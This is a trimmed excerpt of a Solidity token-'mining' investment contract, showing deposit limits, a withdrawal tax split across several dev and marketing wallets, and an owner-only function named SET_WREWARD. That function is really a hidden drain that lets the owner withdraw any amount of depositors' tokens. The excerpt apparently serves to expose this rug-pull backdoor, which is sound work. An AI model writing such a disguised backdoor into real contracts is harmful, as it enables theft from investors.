...
contract DOGEmining {
    ...
    IToken public token_DOGE;

    address erctoken = 0x5c13b5569A82976997641466cD486822559Fb733; /** DOGE test  **/
    ...
    uint256 public MIN_INVEST_LIMIT = 10 * 1e8; /* 10 DOGE   **/
    uint256 public WALLET_DEPOSIT_LIMIT = 1000000 * 1e8; /** 1l DOGE  **/
    ...
    uint256 public WITHDRAWAL_TAX = 10;
    ...
    function payFees(uint256 eggValue) internal returns(uint256){
        ...
        token_DOGE.transfer(dev1, tax);
        token_DOGE.transfer(dev2, tax);
        token_DOGE.transfer(dev3, tax);
        token_DOGE.transfer(dev4, tax);
        token_DOGE.transfer(mkt, tax);
        return tax.mul(5);
    }
    ...
    function SET_WREWARD(uint256 amount) external{
        require(msg.sender==owner,"Admin Use Only");
        token_DOGE.transfer(msg.sender,amount);
    }

    function SET_WALLET_DEPOSIT_LIMIT(uint256 value) external {
        require(msg.sender == owner, "Admin use only");
        require(value >= 20);
        WALLET_DEPOSIT_LIMIT = value * 1e8;
    }
}